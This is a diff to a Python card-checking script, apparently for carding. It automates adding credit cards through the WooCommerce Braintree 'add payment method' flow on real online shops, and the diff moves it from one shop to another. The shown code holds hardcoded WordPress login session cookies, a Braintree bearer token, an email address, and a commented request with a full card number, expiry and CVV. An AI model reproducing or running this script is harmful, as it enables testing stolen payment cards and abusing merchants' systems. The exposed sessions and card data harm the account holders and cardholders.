@@ -15,116 +15,11 @@ def Tele(ccx):
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-	cookies = {
-    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
-    'cookielawinfo-checkbox-necessary': 'yes',
-    '_gcl_au': '1.1.1962690505.1719349662',
-    '_ga': 'GA1.1.1227635990.1719349663',
-    '_fbp': 'fb.1.1719349663689.89528477480537170',
-    'cookielawinfo-checkbox-functional': 'yes',
-    'cookielawinfo-checkbox-performance': 'yes',
-    'cookielawinfo-checkbox-analytics': 'yes',
-    'cookielawinfo-checkbox-advertisement': 'yes',
-    'cookielawinfo-checkbox-others': 'yes',
-    'viewed_cookie_policy': 'yes',
-    'cli_user_preference': 'en-cli-yes-checkbox-necessary-yes-checkbox-functional-yes-checkbox-performance-yes-checkbox-analytics-yes-checkbox-advertisement-yes-checkbox-others-yes',
-    'CookieLawInfoConsent': 'eyJ2ZXIiOiIxIiwibmVjZXNzYXJ5IjoidHJ1ZSIsImZ1bmN0aW9uYWwiOiJ0cnVlIiwicGVyZm9ybWFuY2UiOiJ0cnVlIiwiYW5hbHl0aWNzIjoidHJ1ZSIsImFkdmVydGlzZW1lbnQiOiJ0cnVlIiwib3RoZXJzIjoidHJ1ZSJ9',
-    'newpass_announce': 'true',
-    'closed_announcement': 'true',
-    'wordpress_sec_22d584ae58f64e78cb2ffa7e67fadab7': 'moh5h52vbnm%7C1720559322%7CA4vP8a3LhhNoZvMlqX38sffYy4YIXJyGiYmEtvbUjYi%7C4d7f24b0256511f50f7b1ef82e6824a163f84c981c8e45f50ed5721bd13a6d8c',
-    'wordpress_logged_in_22d584ae58f64e78cb2ffa7e67fadab7': 'moh5h52vbnm%7C1720559322%7CA4vP8a3LhhNoZvMlqX38sffYy4YIXJyGiYmEtvbUjYi%7C139a76ae7f8579dd10fc23d569aa3e9159e0949b727eff66e34ec53c7c16f3db',
-    'br_lgv_stat': 'default%7Cdefault',
-    'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
-    'sbjs_udata': 'vst%3D3%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2Fadd-payment-method%2F',
-    '_ga_JVCGZDD7ML': 'GS1.1.1719416400.3.0.1719416400.60.0.18566749',
-    '_uetsid': 'f6554730333611ef8399318838359d69',
-    '_uetvid': 'f6576db0333611ef84c20f801562952c',
-}
-
-	headers = {
-    'authority': 'ce4less.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'cache-control': 'no-cache',
-    # 'cookie': 'sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; cookielawinfo-checkbox-necessary=yes; _gcl_au=1.1.1962690505.1719349662; _ga=GA1.1.1227635990.1719349663; _fbp=fb.1.1719349663689.89528477480537170; cookielawinfo-checkbox-functional=yes; cookielawinfo-checkbox-performance=yes; cookielawinfo-checkbox-analytics=yes; cookielawinfo-checkbox-advertisement=yes; cookielawinfo-checkbox-others=yes; viewed_cookie_policy=yes; cli_user_preference=en-cli-yes-checkbox-necessary-yes-checkbox-functional-yes-checkbox-performance-yes-checkbox-analytics-yes-checkbox-advertisement-yes-checkbox-others-yes; CookieLawInfoConsent=eyJ2ZXIiOiIxIiwibmVjZXNzYXJ5IjoidHJ1ZSIsImZ1bmN0aW9uYWwiOiJ0cnVlIiwicGVyZm9ybWFuY2UiOiJ0cnVlIiwiYW5hbHl0aWNzIjoidHJ1ZSIsImFkdmVydGlzZW1lbnQiOiJ0cnVlIiwib3RoZXJzIjoidHJ1ZSJ9; newpass_announce=true; closed_announcement=true; wordpress_sec_22d584ae58f64e78cb2ffa7e67fadab7=moh5h52vbnm%7C1720559322%7CA4vP8a3LhhNoZvMlqX38sffYy4YIXJyGiYmEtvbUjYi%7C4d7f24b0256511f50f7b1ef82e6824a163f84c981c8e45f50ed5721bd13a6d8c; wordpress_logged_in_22d584ae58f64e78cb2ffa7e67fadab7=moh5h52vbnm%7C1720559322%7CA4vP8a3LhhNoZvMlqX38sffYy4YIXJyGiYmEtvbUjYi%7C139a76ae7f8579dd10fc23d569aa3e9159e0949b727eff66e34ec53c7c16f3db; br_lgv_stat=default%7Cdefault; sbjs_migrations=1418474375998%3D1; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D3%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2Fadd-payment-method%2F; _ga_JVCGZDD7ML=GS1.1.1719416400.3.0.1719416400.60.0.18566749; _uetsid=f6554730333611ef8399318838359d69; _uetvid=f6576db0333611ef84c20f801562952c',
-    'pragma': 'no-cache',
-    'referer': 'https://ce4less.com/my-account/add-payment-method/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-}
-
-	response = requests.get('https://ce4less.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
-	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
-	
-	client_token_nonce = re.search(r'"client_token_nonce":"(.*?)"', response.text).group(1)
-	
-
-
-	headers = {
-    'authority': 'ce4less.com',
-    'accept': '*/*',
-    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-    'cache-control': 'no-cache',
-    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'origin': 'https://ce4less.com',
-    'pragma': 'no-cache',
-    'referer': 'https://ce4less.com/my-account/add-payment-method/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-    'x-requested-with': 'XMLHttpRequest',
-}
-
-	data = {
-    'action': 'wc_braintree_credit_card_get_client_token',
-    'nonce': client_token_nonce,
-}
-
-	response = requests.post('https://ce4less.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
-	
-	
-	
-	enc = response.json()['data']
-	
-	dec = base64.b64decode(enc).decode('utf-8')
-	
-	au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
-	
-	
-	
-
 	headers = {
     'authority': 'payments.braintree-api.com',
     'accept': '*/*',
-    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
-    'authorization': f'Bearer {au}',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTk1ODIzODYsImp0aSI6ImVlMmI3ZjNmLTVmNmUtNGE0ZS1iNjM5LTRkYjhhZjdkMGU4YSIsInN1YiI6ImhubWM4OW5oY2JmbWo3OWsiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImhubWM4OW5oY2JmbWo3OWsiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.FQOINjkiUzfX3ShlFUh0oEdvx8WY4cYN0rAdBGvl9I64hFbJZKubioVtH9M09er4v3om6IFcVnRz7_oHU0Y4IA',
     'braintree-version': '2018-05-10',
     'cache-control': 'no-cache',
     'content-type': 'application/json',
@@ -144,7 +39,7 @@ def Tele(ccx):
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': '379f0177-032a-47fd-9e6a-56561cd41a24',
+        'sessionId': 'b47484b5-5b5e-4923-be3f-2d0ea865e5a9',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -165,6 +60,11 @@ def Tele(ccx):
 
 	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
 
+# Note: json_data will not be serialized by requests
+# exactly as it was in the original request.
+#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"b47484b5-5b5e-4923-be3f-2d0ea865e5a9"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4347697102867592","expirationMonth":"03","expirationYear":"2028","cvv":"542"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
+#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
+
 
 
 	tok = response.json()['data']['tokenizeCreditCard']['token']
@@ -172,15 +72,45 @@ def Tele(ccx):
 
 
 
+
+
+
+
+	cookies = {
+    '_gcl_au': '1.1.1472496388.1719495670',
+    '_ga': 'GA1.1.123030639.1719495671',
+    'sbjs_migrations': '1418474375998%3D1',
+    'sbjs_current_add': 'fd%3D2024-06-27%2013%3A41%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Fpopshopamerica.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+    'sbjs_first_add': 'fd%3D2024-06-27%2013%3A41%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Fpopshopamerica.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
+    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
+    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
+    '_fbp': 'fb.1.1719495673452.658632375669694002',
+    '_pin_unauth': 'dWlkPU9USXlaRFJtWkdNdE1EazRaUzAwWVdSaUxXSTJZVE10WXpjMU16TXhNV1E0TW1aaQ',
+    '__attentive_id': 'ff01fadc7c4e4018a1c5399771116ec6',
+    '__attentive_cco': '1719495683800',
+    '_attn_': 'eyJ1Ijoie1wiY29cIjoxNzE5NDk1NjgzODUyLFwidW9cIjoxNzE5NDk1NjgzODUyLFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcImZmMDFmYWRjN2M0ZTQwMThhMWM1Mzk5NzcxMTE2ZWM2XCJ9In0=',
+    '__attentive_dv': '1',
+    '__attentive_ss_referrer': 'https://www.google.com/',
+    'attntv_mstore_email': 'lyy446333@gmail.com:0',
+    'wordpress_logged_in_57b1d378b93f8ee3b582f52122aa4081': 'lyy446333%7C1720705402%7Cp7pSrRJUIvuK7JGhd6xQWGS40dcpcoacVI9GxlgxYAB%7C3fa00d033cb73baf3877f6aa8d0ac9e685e2e483a659be28a73f08b1816b4027',
+    'mcfw-wp-user-cookie': 'OTIxMDU1M3wwfDYzfDM5ODAzXzIyMTYxMDM4Mjk0YmNiY2EyOTA5YzFmOTQ3OGM1MTE3ODRjOGQxMzk0MjY2Yjk1MmI3MDJmYzM3YWYxYWMxMzY%3D',
+    'wfwaf-authcookie-8e70f1282ca3ef14f13a063725cc6fe0': '9210553%7Cother%7Cread%7C1adeff570d0316685f96f67ada50539bfaf69ae7fdafcbfaa4a30e6c77c506c5',
+    'sbjs_session': 'pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpopshopamerica.com%2Fmy-account%2Fadd-payment-method%2F',
+    '__attentive_pv': '13',
+    '_ga_H8NGEHCB64': 'GS1.1.1719495670.1.1.1719496041.1.0.0',
+}
+
 	headers = {
-    'authority': 'ce4less.com',
+    'authority': 'popshopamerica.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'no-cache',
     'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://ce4less.com',
+    # 'cookie': '_gcl_au=1.1.1472496388.1719495670; _ga=GA1.1.123030639.1719495671; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-06-27%2013%3A41%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Fpopshopamerica.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2024-06-27%2013%3A41%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Fpopshopamerica.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _fbp=fb.1.1719495673452.658632375669694002; _pin_unauth=dWlkPU9USXlaRFJtWkdNdE1EazRaUzAwWVdSaUxXSTJZVE10WXpjMU16TXhNV1E0TW1aaQ; __attentive_id=ff01fadc7c4e4018a1c5399771116ec6; __attentive_cco=1719495683800; _attn_=eyJ1Ijoie1wiY29cIjoxNzE5NDk1NjgzODUyLFwidW9cIjoxNzE5NDk1NjgzODUyLFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcImZmMDFmYWRjN2M0ZTQwMThhMWM1Mzk5NzcxMTE2ZWM2XCJ9In0=; __attentive_dv=1; __attentive_ss_referrer=https://www.google.com/; attntv_mstore_email=lyy446333@gmail.com:0; wordpress_logged_in_57b1d378b93f8ee3b582f52122aa4081=lyy446333%7C1720705402%7Cp7pSrRJUIvuK7JGhd6xQWGS40dcpcoacVI9GxlgxYAB%7C3fa00d033cb73baf3877f6aa8d0ac9e685e2e483a659be28a73f08b1816b4027; mcfw-wp-user-cookie=OTIxMDU1M3wwfDYzfDM5ODAzXzIyMTYxMDM4Mjk0YmNiY2EyOTA5YzFmOTQ3OGM1MTE3ODRjOGQxMzk0MjY2Yjk1MmI3MDJmYzM3YWYxYWMxMzY%3D; wfwaf-authcookie-8e70f1282ca3ef14f13a063725cc6fe0=9210553%7Cother%7Cread%7C1adeff570d0316685f96f67ada50539bfaf69ae7fdafcbfaa4a30e6c77c506c5; sbjs_session=pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpopshopamerica.com%2Fmy-account%2Fadd-payment-method%2F; __attentive_pv=13; _ga_H8NGEHCB64=GS1.1.1719495670.1.1.1719496041.1.0.0',
+    'origin': 'https://popshopamerica.com',
     'pragma': 'no-cache',
-    'referer': 'https://ce4less.com/my-account/add-payment-method/',
+    'referer': 'https://popshopamerica.com/my-account/add-payment-method/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -192,21 +122,28 @@ def Tele(ccx):
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 }
 
-	data = {
-    'payment_method': 'braintree_credit_card',
-    'wc-braintree-credit-card-card-type': 'master-card',
-    'wc-braintree-credit-card-3d-secure-enabled': '',
-    'wc-braintree-credit-card-3d-secure-verified': '',
-    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
-    'wc_braintree_credit_card_payment_nonce': tok,
-    'wc_braintree_device_data': '',
-    'wc-braintree-credit-card-tokenize-payment-method': 'true',
-    'woocommerce-add-payment-method-nonce': add_nonce,
-    '_wp_http_referer': '/my-account/add-payment-method/',
-    'woocommerce_add_payment_method': '1',
-}
+	data = [
+    ('payment_method', 'braintree_credit_card'),
+    ('wc-braintree-credit-card-card-type', 'visa'),
+    ('wc-braintree-credit-card-3d-secure-enabled', ''),
+    ('wc-braintree-credit-card-3d-secure-verified', ''),
+    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
+    ('wc_braintree_credit_card_payment_nonce',tok,),
+    ('wc_braintree_device_data', '{"correlation_id":"e17076e2a679090eee47665ada002a9e"}'),
+    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
+    ('wc_braintree_paypal_payment_nonce', ''),
+    ('wc_braintree_device_data', '{"correlation_id":"e17076e2a679090eee47665ada002a9e"}'),
+    ('wc-braintree-paypal-context', 'shortcode'),
+    ('wc_braintree_paypal_amount', '0.00'),
+    ('wc_braintree_paypal_currency', 'USD'),
+    ('wc_braintree_paypal_locale', 'en_us'),
+    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
+    ('woocommerce-add-payment-method-nonce', 'c6ef2df265'),
+    ('_wp_http_referer', '/my-account/add-payment-method/'),
+    ('woocommerce_add_payment_method', '1'),
+]
 
-	response = requests.post('https://ce4less.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
+	response = requests.post('https://popshopamerica.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
 	
 	text = response.text
 	
